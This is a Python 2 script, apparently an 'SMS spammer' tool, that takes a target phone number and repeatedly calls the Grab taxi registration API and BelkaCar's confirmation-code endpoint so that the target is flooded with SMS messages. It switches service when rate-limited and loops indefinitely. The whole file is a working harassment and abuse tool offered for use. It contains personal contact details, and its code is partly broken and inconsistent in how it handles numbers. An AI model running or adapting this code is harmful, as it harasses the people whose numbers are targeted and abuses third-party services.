class spymer:
    author = ''

    def main(self):
        print '+-+-+-+-+-+-+-+Spammer v1.3\n|S|p|a|m|m|e|r|\tAuthor: FSystem88\n+-+-+-+-+-+-+-+ https://github.com/FSystem88\n\t\t'
        import requests, datetime, sys, time, argparse
        parser = argparse.ArgumentParser(prog='spymer', description="Fucking shit by Fsystem88. May be not work/ LOL))", epilog='My contacts: +79153509908 (Russia), mail - FSystem88@bk.ru')
        parser.add_argument('phonenum', metavar='phone', help='the phone number (example: 9153509908)')
        parser.add_argument('--delay', type=int, help='the delay time (wait time) in seconds (default: 60)')
        parser.add_argument('--proxy', type=int, help="use a proxy (format: 'http://69.69.69.69:8080')")
        args = parser.parse_args()

        def showstatus(message, type='new'):
            now = datetime.datetime.now().strftime('%H:%M:%S')
            icon = '*'
            if type == 'warn':
                icon = '!'
            else:
                if type == 'new':
                    icon == '*'
            message = '[' + icon + '][' + now + ']' + message
            return message

        def wrapsbrace(string, endspace=False):
            if endspace == True:
                return '[' + string + '] '
            return '[' + string + ']'

        def sleep(x):
            try:
                time.sleep(x)
            except KeyboardInterrupt:
                print '\r' + showstatus(wrapsbrace('except', True) + 'KeyboardInterrupt thrown! Exiting . . .', 'warn')
                exit()

        _phone = args.phonenum
        if _phone[0] == '0':
            _phone = list(_phone)
            _phone[0] = '62'
            _phone = ('').join(_phone)
        if _phone[0] == '8':
            _phone = '62' + str(_phone)
        iteration = 1
        print showstatus(wrapsbrace('info', True) + ('Send SMS to: +7{}').format(_phone))
        delaytime = 60
        if self.author != 'FSystem88':
            while True:
                print showstatus(wrapsbrace('200 OK', True) + ('NO ORIGINAL TOOL'))
                exit()

        if args.delay:
            delaytime = int(args.delay)
        while True:
            try:
                grab = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': '7'+_phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            except KeyboardInterrupt:
                print '\r' + showstatus(wrapsbrace('except', True) + 'KeyboardInterrupt thrown! Exiting . . .', 'warn')
                exit()
            except requests.exceptions.ConnectionError:
                print showstatus(wrapsbrace('except', True) + ('ConnectionError thrown! Sleeping for {}s . . .').format(delaytime), 'warn')
                sleep(delaytime)
            else:
                if grab.status_code == 429:
                    print showstatus(wrapsbrace(('429 {}').format(grab.reason), True) + ('Start next service!'), 'warn')
                    belka = requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': '79153509908'}, headers={})
                    if belka.status_code == 429:
                        print showstatus(wrapsbrace(('429 {}').format(belka.reason), True) + ('The End!'), 'warn')
                        exit()
                    elif belka.status_code == 200:
                        print showstatus(wrapsbrace('200 OK', True) + ('BelkaCar SMS sent! Sleep! Zzz... (iteration:{})').format(iteration))
                        iteration += 1
                        sleep(60)
                    else:
                        print showstatus(wrapsbrace(('{} {}').format(belka.status_code, belka.reason), True) + 'Something went wrong. Exiting . . .', 'warn')
                        exit()
                elif grab.status_code == 200:
                    print showstatus(wrapsbrace('200 OK', True) + ('GRAB SMS sent! Sleep! Zzz... (iteration:{})').format(iteration))
                    iteration += 1
                    sleep(1)
                else:
                    print showstatus(wrapsbrace(('{} {}').format(grab.status_code, grab.reason), True) + 'Something went wrong. Exiting . . .', 'warn')
                    exit()
